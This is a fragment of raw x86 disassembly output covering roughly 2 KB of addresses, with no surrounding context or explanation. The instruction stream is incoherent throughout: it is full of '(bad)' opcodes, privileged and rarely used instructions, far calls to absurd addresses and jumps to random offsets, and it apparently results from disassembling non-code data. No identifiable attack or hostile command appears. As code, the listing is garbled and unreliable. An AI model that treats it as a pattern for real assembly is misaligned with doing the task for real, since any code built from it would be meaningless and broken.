  40488b:	shl    al,cl
  40488d:	dec    eax
  40488e:	iret   
  40488f:	push   esp
  404890:	push   edi
  404891:	bound  eax,QWORD PTR [edi]
  404893:	in     eax,0xbd
  404895:	xlat   BYTE PTR ds:[ebx]
  404896:	repz jmp 0x60f7d24c
  40489c:	cmp    ah,BYTE PTR [ebp-0x2b]
  40489f:	lahf   
  4048a0:	stc    
  4048a1:	out    dx,al
  4048a2:	clts   
  4048a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048a5:	out    0x60,eax
  4048a7:	xor    al,0x78
  4048a9:	lods   eax,DWORD PTR ds:[esi]
  4048aa:	xchg   BYTE PTR [edx-0x34],cl
  4048ad:	adc    DWORD PTR [edx-0x65],edi
  4048b0:	jb     0x404930
  4048b2:	fisttp DWORD PTR [ecx]
  4048b4:	adc    al,0x15
  4048b6:	dec    esp
  4048b7:	cwde   
  4048b8:	jbe    0x404921
  4048ba:	call   0xbda9:0x285544bf
  4048c1:	jge    0x404909
  4048c3:	pop    ss
  4048c4:	inc    eax
  4048c5:	sub    dl,al
  4048c7:	in     eax,dx
  4048c8:	add    DWORD PTR [ebp-0x6ab948e5],edi
  4048ce:	push   0xeaa51f1
  4048d3:	jb     0x404894
  4048d5:	cmp    edi,DWORD PTR [edx+0x9]
  4048d8:	mov    al,ds:0xcdc9b4c2
  4048dd:	mov    esp,0x7ad53a47
  4048e2:	popa   
  4048e3:	push   ebx
  4048e4:	aam    0x1
  4048e6:	mov    ds:0xcb48070b,eax
  4048eb:	push   0x82a159c3
  4048f0:	fwait
  4048f1:	je     0x404907
  4048f3:	ficomp DWORD PTR [esi+0xc]
  4048f6:	and    al,0x1b
  4048f8:	pop    eax
  4048f9:	cld    
  4048fa:	sbb    DWORD PTR [esi-0x42],edx
  4048fd:	fsub   st,st(1)
  4048ff:	idiv   DWORD PTR [esi+0x3f0afacd]
  404905:	and    eax,0xc5af9c64
  40490a:	inc    edx
  40490b:	push   ds
  40490c:	daa    
  40490d:	mov    WORD PTR ds:0xbd03c2f3,?
  404913:	jo     0x404947
  404915:	sbb    ecx,ecx
  404917:	or     ecx,edi
  404919:	out    0x54,al
  40491b:	push   0x62b7513a
  404920:	scas   eax,DWORD PTR es:[edi]
  404921:	(bad)  
  404922:	xlat   BYTE PTR ds:[ebx]
  404923:	dec    esp
  404924:	lahf   
  404925:	sbb    bh,BYTE PTR [edi]
  404927:	ins    BYTE PTR es:[edi],dx
  404928:	dec    ebp
  404929:	fsub   QWORD PTR [edx+0x2a]
  40492c:	mov    edx,0xa8c4a0c0
  404931:	js     0x404918
  404933:	and    DWORD PTR [edx+0x373c6e74],edx
  404939:	cmc    
  40493a:	(bad)  
  40493b:	call   0xee94f55b
  404940:	js     0x4049ab
  404942:	xor    ebp,ecx
  404944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404945:	pop    edi
  404946:	stc    
  404947:	mov    dl,0x9d
  404949:	ffreep st(4)
  40494b:	dec    esp
  40494c:	lock pop DWORD PTR [ecx-0x2e7e5e38]
  404953:	retf   0xefad
  404956:	arpl   WORD PTR [edi+0x241a5c0a],bp
  40495c:	iret   
  40495d:	sbb    bh,cl
  40495f:	js     0x40491b
  404961:	adc    DWORD PTR [ecx],0x36c94aab
  404967:	mov    ah,0xc3
  404969:	adc    ecx,DWORD PTR [ebx]
  40496b:	xor    eax,0x99c05985
  404970:	fcmovb st,st(6)
  404972:	jns    0x40491a
  404974:	and    BYTE PTR [ecx-0xb],bh
  404977:	jno    0x404999
  404979:	mov    ah,dl
  40497b:	adc    BYTE PTR [edi+ecx*1],0x7
  40497f:	xlat   BYTE PTR ds:[ebx]
  404980:	scas   eax,DWORD PTR es:[edi]
  404981:	jle    0x4049d5
  404983:	out    dx,eax
  404984:	(bad)  
  404985:	mov    ds:0x8955d3c0,eax
  40498a:	dec    edx
  40498b:	mov    BYTE PTR [ebx],ah
  40498d:	mov    esi,0xd6843177
  404992:	push   esi
  404993:	add    DWORD PTR [edi],esp
  404995:	mov    ebx,0x978739d
  40499a:	pop    ecx
  40499b:	mov    ecx,0xcc25246b
  4049a0:	fadd   QWORD PTR [ebp-0x4199191c]
  4049a6:	fstp   TBYTE PTR [eax]
  4049a8:	lock daa 
  4049aa:	test   eax,0x62723e9f
  4049af:	xchg   cl,ah
  4049b1:	out    dx,al
  4049b2:	inc    edi
  4049b3:	xchg   esi,eax
  4049b4:	scas   eax,DWORD PTR es:[edi]
  4049b5:	mov    edi,0xbf3cc677
  4049ba:	test   al,0x9b
  4049bc:	jmp    0x40499e
  4049be:	adc    edx,DWORD PTR [ebx]
  4049c0:	xchg   ebx,eax
  4049c1:	mov    ah,0xf8
  4049c3:	icebp  
  4049c4:	imul   edi,DWORD PTR [ebp+0x4535af99],0x52
  4049cb:	sahf   
  4049cc:	cmp    edx,DWORD PTR [esi-0x2f]
  4049cf:	dec    ebp
  4049d0:	pop    edx
  4049d1:	aas    
  4049d2:	es (bad) 
  4049d4:	enter  0x3618,0x5e
  4049d8:	mov    ah,0x31
  4049da:	sar    bh,cl
  4049dc:	xchg   edi,eax
  4049dd:	fnstcw WORD PTR [eax+edi*1-0xd7a8ffc]
  4049e4:	sahf   
  4049e5:	nop
  4049e6:	mov    dl,0x3b
  4049e8:	mov    esp,0xc9210299
  4049ed:	mov    DWORD PTR [ebx],eax
  4049ef:	out    dx,eax
  4049f0:	fwait
  4049f1:	jmp    0x404a45
  4049f3:	pushf  
  4049f4:	add    eax,0xecc1fd54
  4049f9:	jno    0x4049f0
  4049fb:	(bad)  
  4049fc:	loope  0x404a2e
  4049fe:	fsubrp st(3),st
  404a00:	cwde   
  404a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a02:	aas    
  404a03:	fisubr WORD PTR [ebp+0x68f7f73b]
  404a09:	test   DWORD PTR [ecx],edx
  404a0b:	mov    edi,0x3dec34dc
  404a10:	scas   al,BYTE PTR es:[edi]
  404a11:	adc    eax,0xca9194ab
  404a16:	mov    ss,WORD PTR [edi-0x23]
  404a19:	sbb    al,0x8c
  404a1b:	adc    eax,0x63f519ec
  404a20:	in     al,dx
  404a21:	repz scas eax,DWORD PTR es:[edi]
  404a23:	out    0x27,eax
  404a25:	fwait
  404a26:	out    0xb6,al
  404a28:	or     ah,bl
  404a2a:	test   DWORD PTR [edi+0x571fbf0a],ebp
  404a30:	jp     0x4049fe
  404a32:	sbb    edx,0x47
  404a35:	jmp    0x7220d100
  404a3a:	into   
  404a3b:	push   ss
  404a3c:	(bad)  
  404a3e:	sub    edi,DWORD PTR ds:0xf87e13e5
  404a44:	dec    eax
  404a45:	dec    ebp
  404a46:	cmp    BYTE PTR [ebx+edx*2],dl
  404a49:	pop    ds
  404a4a:	pop    ecx
  404a4b:	or     ecx,DWORD PTR [edi]
  404a4d:	pop    ds
  404a4e:	div    dl
  404a50:	adc    al,0x61
  404a52:	loopne 0x404a82
  404a54:	scas   al,BYTE PTR es:[edi]
  404a55:	dec    ebp
  404a56:	in     al,dx
  404a57:	and    BYTE PTR [ebp+edx*4-0x17],bl
  404a5b:	push   ebx
  404a5c:	stos   BYTE PTR es:[edi],al
  404a5d:	xchg   ebx,eax
  404a5e:	jae    0x404a4e
  404a60:	ds jmp 0x404a62
  404a63:	jmp    0x88e9c151
  404a68:	lahf   
  404a69:	adc    DWORD PTR [esi-0x55],ebx
  404a6c:	imul   ecx,DWORD PTR es:[esi-0x35],0xb009324b
  404a74:	sub    dh,BYTE PTR [ebx+eiz*8+0x28]
  404a78:	adc    esp,DWORD PTR [eax]
  404a7a:	xor    al,0xb1
  404a7c:	ins    BYTE PTR es:[edi],dx
  404a7d:	inc    ecx
  404a7e:	add    eax,DWORD PTR [edi+0x19c2142e]
  404a84:	mov    eax,ds:0x32aa8e7f
  404a89:	jae    0x404a0e
  404a8b:	push   edx
  404a8c:	hlt    
  404a8d:	and    eax,0x61b31223
  404a92:	je     0x404a1c
  404a94:	bnd jmp 0x404aff
  404a97:	retf   
  404a98:	imul   esi,edx,0x9f8618d8
  404a9e:	adc    BYTE PTR [ecx+ecx*2+0x5eb61a0c],al
  404aa5:	pop    esi
  404aa6:	sbb    eax,0x25630606
  404aab:	xchg   edx,eax
  404aac:	jecxz  0x404af0
  404aae:	xor    ah,BYTE PTR [edx-0x7a]
  404ab1:	ins    DWORD PTR es:[edi],dx
  404ab2:	aam    0x37
  404ab4:	int3   
  404ab5:	mov    ecx,0xa8eae27c
  404aba:	sub    al,0x69
  404abc:	pop    ds
  404abd:	add    al,0xb4
  404abf:	stos   BYTE PTR es:[edi],al
  404ac0:	int    0xc3
  404ac2:	add    ebx,DWORD PTR [eax+0x44]
  404ac5:	jle    0x404af1
  404ac7:	adc    DWORD PTR [ebx],edi
  404ac9:	call   0x4740:0xe72e5bb
  404ad0:	imul   edx,DWORD PTR ds:0x7ce3e1ee,0xffffff92
  404ad7:	push   esp
  404ad8:	das    
  404ad9:	hlt    
  404ada:	push   edx
  404adb:	xor    al,0xc2
  404add:	push   ebx
  404ade:	jl     0x404a65
  404ae0:	and    al,0x98
  404ae2:	ret    
  404ae3:	shl    dl,1
  404ae5:	xchg   esp,eax
  404ae6:	(bad)  
  404ae8:	sbb    BYTE PTR [ecx+0x74],ch
  404aeb:	push   ebp
  404aec:	pop    es
  404aed:	add    dh,BYTE PTR [ebp-0x73]
  404af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404af1:	add    DWORD PTR [ebx+0x225bb895],eax
  404af7:	push   ds
  404af8:	es ins BYTE PTR es:[edi],dx
  404afa:	sti    
  404afb:	cmp    eax,0x47cb9dd0
  404b00:	add    al,0x77
  404b02:	xor    bl,dh
  404b04:	fwait
  404b05:	fs jno 0x404b66
  404b08:	sbb    al,0x88
  404b0a:	ffreep st(0)
  404b0c:	mov    al,BYTE PTR [eax]
  404b0e:	xchg   ebx,eax
  404b0f:	push   ebp
  404b10:	lds    esi,FWORD PTR [edx+0x253daae4]
  404b16:	mov    al,0x4e
  404b18:	cmp    DWORD PTR [edi],0x3229a3a6
  404b1e:	xchg   esi,eax
  404b1f:	fs jno 0x404ac6
  404b22:	arpl   WORD PTR [ebp-0x4d],ax
  404b25:	ds gs div ebp
  404b29:	fcom   QWORD PTR [ebx]
  404b2b:	sub    edx,edi
  404b2d:	cmp    edi,DWORD PTR [ebx+0x29]
  404b30:	adc    dl,BYTE PTR [ecx+0x73]
  404b33:	sbb    cl,BYTE PTR [edi-0x10f0d963]
  404b39:	mov    esp,0x636c8b38
  404b3e:	add    dh,BYTE PTR [eax+0x3d994692]
  404b44:	in     al,dx
  404b45:	add    DWORD PTR [ecx],eax
  404b47:	(bad)  
  404b48:	pop    eax
  404b49:	leave  
  404b4a:	clc    
  404b4b:	aas    
  404b4c:	imul   edi,DWORD PTR [edi],0xa9f5ab19
  404b52:	pushf  
  404b53:	jno    0x404b0d
  404b55:	out    dx,eax
  404b56:	lahf   
  404b57:	dec    edx
  404b58:	xor    BYTE PTR [esi],0x68
  404b5b:	sub    eax,0x2ea04603
  404b60:	mov    DWORD PTR [ebp+0x67],esi
  404b63:	xchg   ebx,eax
  404b64:	inc    edi
  404b65:	mov    esp,0x7b63a143
  404b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b6b:	mov    cl,0xdb
  404b6d:	mov    ah,0x8
  404b6f:	sar    dh,cl
  404b71:	nop
  404b72:	mov    ah,0x3f
  404b74:	push   edx
  404b75:	pusha  
  404b76:	dec    ebx
  404b77:	pop    es
  404b78:	mov    eax,0x7c660069
  404b7d:	xchg   DWORD PTR [ebx+ebx*1+0x51c348c9],ecx
  404b84:	and    ch,BYTE PTR [edx-0x31]
  404b87:	cmp    ch,al
  404b89:	fist   DWORD PTR [ecx+edi*1]
  404b8c:	fmul   QWORD PTR [ecx]
  404b8e:	or     DWORD PTR ds:0xe38a775b,0x10cd8ea9
  404b98:	popf   
  404b99:	add    al,0x6f
  404b9b:	mov    dl,0xfc
  404b9d:	mov    ebx,DWORD PTR [eax]
  404b9f:	repz in eax,dx
  404ba1:	push   0x3d
  404ba3:	cmp    al,0x96
  404ba5:	jl     0x404c24
  404ba7:	es cmp al,0x94
  404baa:	pop    ebp
  404bab:	(bad)
  404bae:	jae    0x404b80
  404bb0:	test   eax,0x93bd88b4
  404bb5:	call   0x1ae4fab7
  404bba:	fnsave [ebp-0x55f5f780]
  404bc0:	sub    BYTE PTR [ecx-0x741dff40],dl
  404bc6:	cmp    al,0x5f
  404bc8:	push   ebp
  404bc9:	cmp    al,0x5c
  404bcb:	push   ds
  404bcc:	xor    eax,0x86022d85
  404bd1:	dec    edx
  404bd2:	lock dec esp
  404bd4:	xor    ebp,DWORD PTR [edi+0x2f]
  404bd7:	push   edx
  404bd8:	addr16 ds aaa 
  404bdb:	push   edi
  404bdc:	and    edi,eax
  404bde:	jne    0x404bb7
  404be0:	jl     0x404c0b
  404be2:	in     eax,dx
  404be3:	cmp    edi,DWORD PTR [ebx-0x75]
  404be6:	inc    esp
  404be7:	icebp  
  404be8:	stos   DWORD PTR es:[edi],eax
  404be9:	shl    BYTE PTR [ebx-0x7367ce36],cl
  404bef:	dec    esi
  404bf0:	cwde   
  404bf1:	rol    DWORD PTR [edx+0x66],1
  404bf4:	xchg   esi,eax
  404bf5:	and    ah,BYTE PTR [ebp+eax*8-0x26204ca5]
  404bfc:	mov    dl,0xb4
  404bfe:	in     eax,0x1c
  404c00:	ja     0x404c4b
  404c02:	push   esp
  404c03:	fistp  WORD PTR [esi]
  404c05:	inc    esi
  404c06:	into   
  404c07:	mov    ebx,0x6a497833
  404c0c:	push   esp
  404c0d:	les    ebp,FWORD PTR ds:0x45692eba
  404c13:	bound  ecx,QWORD PTR [esi]
  404c15:	xor    BYTE PTR [edx+edi*8],dh
  404c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c19:	or     DWORD PTR [edx+ecx*8],ebx
  404c1c:	ds or  dh,ah
  404c1f:	add    BYTE PTR [ebx-0x97d3d47],dh
  404c25:	loopne 0x404c27
  404c27:	jle    0x404bd4
  404c29:	shl    DWORD PTR [ebp+0x127c02cb],0xf8
  404c30:	jp     0x404c9a
  404c32:	push   eax
  404c33:	aad    0xb1
  404c35:	xlat   BYTE PTR ds:[ebx]
  404c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c37:	popf   
  404c38:	call   0x41571c3
  404c3d:	scas   al,BYTE PTR es:[edi]
  404c3e:	inc    esi
  404c3f:	(bad)  
  404c40:	fistp  DWORD PTR [esi+0x2e]
  404c43:	les    ecx,FWORD PTR [edi+eiz*4-0x383077f0]
  404c4a:	(bad)  
  404c4c:	test   BYTE PTR [ebx],0x56
  404c4f:	popf   
  404c50:	inc    edx
  404c51:	mov    ebp,0xb973856f
  404c56:	inc    esp
  404c57:	xlat   BYTE PTR gs:[ebx]
  404c59:	lea    esi,[ebp-0x19]
  404c5c:	pushf  
  404c5d:	jl     0x404c52
  404c5f:	aaa    
  404c60:	out    dx,eax
  404c61:	push   ss
  404c62:	test   al,0xbb
  404c64:	jo     0x404c26
  404c66:	pop    edi
  404c67:	lahf   
  404c68:	ror    DWORD PTR [edi],0xcc
  404c6b:	mov    ds:0xcb4ce2c0,eax
  404c70:	mov    cl,0xf2
  404c72:	outs   dx,DWORD PTR ds:[esi]
  404c73:	outs   dx,BYTE PTR ds:[esi]
  404c74:	sub    BYTE PTR [eax],bh
  404c76:	add    dl,BYTE PTR [ecx+0x1924e7a4]
  404c7c:	or     edx,0xffffffa5
  404c7f:	ror    DWORD PTR [ecx-0x6d],0xb8
  404c83:	jmp    0x404cde
  404c85:	pop    ebx
  404c86:	or     eax,0x73d469e1
  404c8b:	inc    ebx
  404c8c:	mov    BYTE PTR [ebp+ecx*1+0x3f159a],bh
  404c93:	push   ecx
  404c94:	sbb    ah,ah
  404c96:	mov    dl,0x14
  404c98:	fisubr DWORD PTR [esp+esi*1]
  404c9b:	pop    ds
  404c9c:	add    BYTE PTR [edi+ecx*1+0x53],cl
  404ca0:	jge    0x404cdc
  404ca2:	mov    al,0x6b
  404ca4:	mov    bh,0x2e
  404ca6:	pop    ecx
  404ca7:	jns    0x404c6a
  404ca9:	icebp  
  404caa:	xor    DWORD PTR [edi+0x33ac95c0],eax
  404cb0:	xor    al,0xf8
  404cb2:	jo     0x404d0a
  404cb4:	adc    esp,eax
  404cb6:	jg     0x404d37
  404cb8:	inc    ebp
  404cb9:	jl     0x404c43
  404cbb:	push   0x2084f4a0
  404cc0:	or     esi,DWORD PTR ds:0x3726084b
  404cc6:	(bad)  
  404cc7:	jge    0x404d03
  404cc9:	das    
  404cca:	dec    esi
  404ccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ccc:	push   ebx
  404ccd:	leave  
  404cce:	std    
  404ccf:	sub    DWORD PTR [edx-0x7c],0xdfec14b9
  404cd6:	cli    
  404cd7:	(bad)
  404cdb:	push   ebx
  404cdc:	pop    esi
  404cdd:	mov    ds:0xa476d77,eax
  404ce2:	jb     0x404c75
  404ce4:	out    dx,al
  404ce5:	sbb    BYTE PTR [ebp-0x68],0x3c
  404ce9:	pop    ebp
  404cea:	repnz popf 
  404cec:	xor    bl,bl
  404cee:	add    eax,0xf5cefedb
  404cf3:	fcomp  DWORD PTR [ecx]
  404cf5:	cmp    cl,BYTE PTR [ebx+0x2c]
  404cf8:	sahf   
  404cf9:	test   ebx,eax
  404cfb:	ds fcmovnu st,st(7)
  404cfe:	fnstenv [edx-0x5f]
  404d01:	add    BYTE PTR [ebx+ecx*2+0x5],dl
  404d05:	xor    eax,edi
  404d07:	pusha  
  404d08:	cmp    eax,0x71428680
  404d0d:	push   ss
  404d0e:	ret    
  404d0f:	aad    0x49
  404d11:	inc    edx
  404d12:	mov    bh,0xef
  404d14:	xor    ebp,DWORD PTR [ecx+0x2f]
  404d17:	pushf  
  404d18:	clc    
  404d19:	lods   eax,DWORD PTR ds:[esi]
  404d1a:	scas   eax,DWORD PTR es:[edi]
  404d1b:	nop
  404d1c:	pop    ds
  404d1d:	imul   edi,DWORD PTR [ecx],0xffffffb6
  404d20:	idiv   DWORD PTR [eax+0x3bb73fa5]
  404d26:	and    eax,0x611d9fa3
  404d2b:	cmp    BYTE PTR [esi-0x35],ch
  404d2e:	push   cs
  404d2f:	jne    0x404d7c
  404d31:	xchg   ebx,eax
  404d32:	outs   dx,BYTE PTR ds:[esi]
  404d33:	std    
  404d34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d35:	cmp    ebp,ebx
  404d37:	or     al,0x7f
  404d39:	jmp    0x404d31
  404d3b:	fbld   TBYTE PTR [edx]
  404d3d:	dec    edi
  404d3e:	cmp    BYTE PTR [esi*4-0xfca580c],cl
  404d45:	jle    0x404d36
  404d47:	ins    DWORD PTR es:[edi],dx
  404d48:	mov    ah,BYTE PTR [esi-0x80]
  404d4b:	stc    
  404d4c:	fmul   st,st(6)
  404d4e:	pop    ebx
  404d4f:	out    dx,al
  404d50:	mov    al,ds:0x48098ffe
  404d55:	xchg   edi,eax
  404d56:	add    al,0x37
  404d58:	scas   eax,DWORD PTR es:[edi]
  404d59:	fcmovu st,st(0)
  404d5b:	xor    edx,DWORD PTR [ebx+0x7f]
  404d5e:	or     esi,ecx
  404d60:	sub    DWORD PTR [ebx-0x1df8e03a],0x98ea1b53
  404d6a:	pop    ebp
  404d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d6c:	cwde   
  404d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d6e:	jae    0x404d60
  404d70:	popf   
  404d71:	pop    eax
  404d72:	imul   edx,DWORD PTR [edx-0x2d],0xffffffac
  404d76:	xor    al,0xba
  404d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d79:	dec    di
  404d7b:	adc    al,0xd9
  404d7d:	jmp    0x404d8a
  404d7f:	wbinvd 
  404d81:	dec    esi
  404d82:	aas    
  404d83:	mov    ebx,0xf5b59654
  404d88:	jl     0x404d39
  404d8a:	mov    ds:0x32ec5d03,eax
  404d8f:	mul    DWORD PTR [eax-0x18ffb7b7]
  404d95:	lea    esi,[eax-0x5b42fef1]
  404d9b:	xlat   BYTE PTR ds:[ebx]
  404d9c:	mov    cl,0x63
  404d9e:	mov    eax,0x9d6b60e9
  404da3:	and    DWORD PTR [ebx+edi*2+0x28],esi
  404da7:	mov    esp,DWORD PTR [edi-0x5a2d427d]
  404dad:	sbb    DWORD PTR ds:0x8ab7f657,esi
  404db3:	sub    BYTE PTR [ecx-0x7e],dh
  404db6:	(bad)  
  404db7:	xchg   esp,eax
  404db8:	and    edi,0xffffffee
  404dbb:	fimul  DWORD PTR [edx-0x7e4a2bc6]
  404dc1:	in     al,dx
  404dc2:	leave  
  404dc3:	add    cl,BYTE PTR [edi-0x4f334392]
  404dc9:	adc    al,BYTE PTR [ecx+esi*8]
  404dcc:	adc    eax,0x3a2f3245
  404dd1:	mov    bl,0x93
  404dd3:	cmp    ebp,DWORD PTR [edx-0x655b1e73]
  404dd9:	sbb    BYTE PTR [ebx-0xc],bl
  404ddc:	out    dx,eax
  404ddd:	push   ss
  404dde:	mov    al,0xdd
  404de0:	sahf   
  404de1:	and    BYTE PTR [ecx],0xf8
  404de4:	push   ebp
  404de5:	pop    es
  404de6:	pop    eax
  404de7:	dec    eax
  404de8:	or     eax,DWORD PTR [edx-0x2dacd245]
  404dee:	xchg   DWORD PTR [edi-0x21720c35],edx
  404df4:	aam    0x77
  404df6:	ror    DWORD PTR [esi],1
  404df8:	sbb    ebx,ebp
  404dfa:	cli    
  404dfb:	inc    ebp
  404dfc:	xor    dh,al
  404dfe:	pop    ecx
  404dff:	or     ebx,DWORD PTR [ecx-0x752b680a]
  404e05:	idiv   BYTE PTR ds:0x8018069
  404e0b:	cmp    al,0x8d
  404e0d:	retf   
  404e0e:	cmp    eax,0xaebccbaa
  404e13:	jno    0x404e46
  404e15:	sub    BYTE PTR [ebp-0x1c23d9e3],ah
  404e1b:	aas    
  404e1c:	push   0xc958bc9c
  404e21:	into   
  404e22:	mov    eax,ds:0x37bfa399
  404e27:	inc    dl
  404e29:	xchg   edx,eax
  404e2a:	xchg   edx,eax
  404e2b:	(bad)  
  404e2d:	sbb    BYTE PTR [ebx],al
  404e2f:	push   esi
  404e30:	ins    DWORD PTR es:[edi],dx
  404e31:	jo     0x404df6
  404e33:	add    bh,BYTE PTR es:[edx+0x44]
  404e37:	imul   ebx,DWORD PTR ds:0xe436d52c,0xffffff9a
  404e3e:	hlt    
  404e3f:	fucomip st,st(5)
  404e41:	sub    BYTE PTR [ebx],al
  404e43:	xlat   BYTE PTR ds:[ebx]
  404e44:	leave  
  404e45:	pushf  
  404e46:	or     ebp,DWORD PTR [eax+0x2b]
  404e49:	in     eax,0xdf
  404e4b:	aam    0x20
  404e4d:	add    eax,0xd140dc1d
  404e52:	push   ss
  404e53:	adc    eax,0x14543460
  404e58:	pop    edi
  404e59:	pop    eax
  404e5a:	dec    ebp
  404e5b:	mov    edi,0x762cd2c0
  404e60:	test   eax,0x51dba812
  404e65:	js     0x404e56
  404e67:	pusha  
  404e68:	xlat   BYTE PTR ds:[ebx]
  404e69:	fmul   DWORD PTR [edx+esi*4]
  404e6c:	sbb    BYTE PTR ds:0x68c2883,dh
  404e72:	lds    ebp,FWORD PTR [ebx]
  404e74:	xlat   BYTE PTR ds:[ebx]
  404e75:	popf   
  404e76:	jbe    0x404e7d
  404e78:	and    BYTE PTR [esi],al
  404e7a:	icebp  
  404e7b:	retf   0x45d7
  404e7e:	adc    BYTE PTR [esi],bh
  404e80:	into   
  404e81:	fisttp WORD PTR [edi+0x2dff8c0e]
  404e87:	adc    BYTE PTR [ecx+esi*2+0x6e29fa6f],ah
  404e8e:	mov    esi,0x3e56e1b8
  404e93:	cs in  al,0x87
  404e96:	mov    ebx,0xb8088f9
  404e9b:	lahf   
  404e9c:	mov    ecx,0xbf49d00a
  404ea1:	pop    ds
  404ea2:	mov    bl,0x3b
  404ea4:	pushf  
  404ea5:	or     al,0x11
  404ea7:	clc    
  404ea8:	pop    esi
  404ea9:	and    eax,0x20cc7e0a
  404eae:	jnp    0x404ea0
  404eb0:	bound  esp,QWORD PTR [ebx+0x644e0c0a]
  404eb6:	lahf   
  404eb7:	dec    edi
  404eb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eb9:	pop    ebp
  404eba:	sbb    eax,0xc8c52101
  404ebf:	in     eax,0x81
  404ec1:	int    0xf2
  404ec3:	lock or DWORD PTR [ebx+0x21],edx
  404ec7:	mov    fs,WORD PTR [esi]
  404ec9:	sbb    ah,ch
  404ecb:	xor    ebx,DWORD PTR [ebp-0x3c]
  404ece:	fldenv [eax+eiz*8+0x68]
  404ed2:	pop    ebx
  404ed3:	shr    BYTE PTR [ebx],1
  404ed5:	dec    edx
  404ed6:	ins    BYTE PTR es:[edi],dx
  404ed7:	jne    0x404ee3
  404ed9:	iret   
  404eda:	xor    DWORD PTR [edx-0x7e],edx
  404edd:	lock dec edi
  404edf:	jae    0x404e98
  404ee1:	and    DWORD PTR [ebx-0x143210b6],0x39
  404ee8:	xchg   ecx,eax
  404ee9:	retf   
  404eea:	push   0xe1a0bbad
  404eef:	xor    BYTE PTR [eax-0x3c],bh
  404ef2:	inc    esi
  404ef3:	lahf   
  404ef4:	fist   DWORD PTR [edx+0x5d]
  404ef7:	test   eax,0x5cea02c1
  404efc:	and    BYTE PTR [eax],bh
  404efe:	ds enter 0x53b4,0xc6
  404f03:	sub    BYTE PTR [eax],ah
  404f05:	(bad)  
  404f06:	fmul   QWORD PTR [edx+0x69]
  404f09:	mov    bx,0xe749
  404f0d:	push   edx
  404f0e:	push   esp
  404f0f:	sub    al,0x3a
  404f11:	imul   esp,DWORD PTR [ebx+0x171a42a8],0xe
  404f18:	push   es
  404f19:	and    ah,BYTE PTR [eax]
  404f1b:	mov    bl,0x3b
  404f1d:	jmp    0x404f20
  404f1f:	mov    al,bl
  404f21:	push   edx
  404f22:	push   ebx
  404f23:	xor    ebx,DWORD PTR [ecx]
  404f25:	and    al,0x27
  404f27:	ret    
  404f28:	mov    edi,0x10f53e1b
  404f2d:	jbe    0x404f10
  404f2f:	mov    eax,0xe3abf081
  404f34:	stos   BYTE PTR es:[edi],al
  404f35:	and    dh,BYTE PTR [eax-0x65043284]
  404f3b:	sbb    DWORD PTR [ebx],edi
  404f3d:	jae    0x404f0c
  404f3f:	jae    0x404f33
  404f41:	fisttp QWORD PTR [eax]
  404f43:	mov    BYTE PTR [eax+eiz*8-0x14],ah
  404f47:	and    BYTE PTR [edi-0x1c],ah
  404f4a:	pop    eax
  404f4b:	gs dec ecx
  404f4d:	sahf   
  404f4e:	jns    0x404f2d
  404f50:	mov    edi,0x8ae43bac
  404f55:	sbb    al,0x9d
  404f57:	ss push 0x51
  404f5a:	jl     0x404f69
  404f5c:	inc    ebx
  404f5d:	jg     0x404fab
  404f5f:	sub    eax,0x91b1dcb5
  404f64:	ret    
  404f65:	dec    edx
  404f66:	hlt    
  404f67:	sub    BYTE PTR [esi],0x7e
  404f6a:	adc    al,0xa4
  404f6c:	and    DWORD PTR [ebp-0x7ed35b12],esp
  404f72:	inc    esp
  404f73:	inc    esp
  404f74:	mov    ebx,0x6e0964f2
  404f79:	stos   BYTE PTR es:[edi],al
  404f7a:	xchg   esp,eax
  404f7b:	enter  0x9677,0xfe
  404f7f:	or     esi,ebx
  404f81:	adc    DWORD PTR [ecx+esi*1+0x3aa1c6d7],edi
  404f88:	jo     0x404f53
  404f8a:	jg     0x404f93
  404f8c:	pop    esp
  404f8d:	jp     0x404fa3
  404f8f:	cmp    eax,0x59e45320
  404f94:	sub    al,0x87
  404f96:	or     eax,DWORD PTR [ebx]
  404f98:	cld    
  404f99:	enter  0xf5d0,0xf4
  404f9d:	fnsave [ebp-0x25]
  404fa0:	iret   
  404fa1:	xor    al,0xa8
  404fa3:	retf   
  404fa4:	and    cl,cl
  404fa6:	out    dx,al
  404fa7:	pop    eax
  404fa8:	sbb    eax,0xf0cb5b65
  404fad:	and    al,0x9c
  404faf:	fld    QWORD PTR [ebp-0x3e]
  404fb2:	ins    DWORD PTR es:[edi],dx
  404fb3:	and    eax,0x48fdd2e2
  404fb8:	fld    QWORD PTR [ebx+ebp*2+0x46c1b506]
  404fbf:	mov    eax,ds:0xf3566a8
  404fc4:	push   ebp
  404fc5:	add    eax,0x7e3c931e
  404fca:	mov    al,ds:0x6c70fb84
  404fcf:	push   ds
  404fd0:	push   edx
  404fd1:	push   0x410e9912
  404fd6:	inc    esp
  404fd7:	jo     0x404fa3
  404fd9:	(bad)  
  404fda:	aad    0xe7
  404fdc:	shl    DWORD PTR [ecx+0x2ca4e50a],1
  404fe2:	dec    edi
  404fe3:	and    DWORD PTR [edx],edi
  404fe5:	dec    edi
  404fe6:	cmp    BYTE PTR ds:0xab0f7e64,dh
  404fec:	mov    ch,0x58
  404fee:	and    dl,dl
  404ff0:	stos   BYTE PTR es:[edi],al
  404ff1:	ja     0x40504c
  404ff3:	xor    al,0x89
  404ff5:	cmp    BYTE PTR [edx],dl
  404ff7:	cmp    BYTE PTR [ecx-0x1d12de7b],ch
  404ffd:	enter  0xfe5f,0x45
  405001:	xor    BYTE PTR [edx+esi*4-0x23],al
  405005:	es lock xchg edi,eax
  405008:	jae    0x405030
  40500a:	arpl   WORD PTR [ebx],di
  40500c:	inc    eax
  40500d:	dec    ebp
  40500e:	jae    0x404fc1
  405010:	mov    ecx,0xe8f57550
  405015:	mov    esp,0x4b1d617b
  40501a:	mov    dl,0x20
  40501c:	sbb    eax,edx
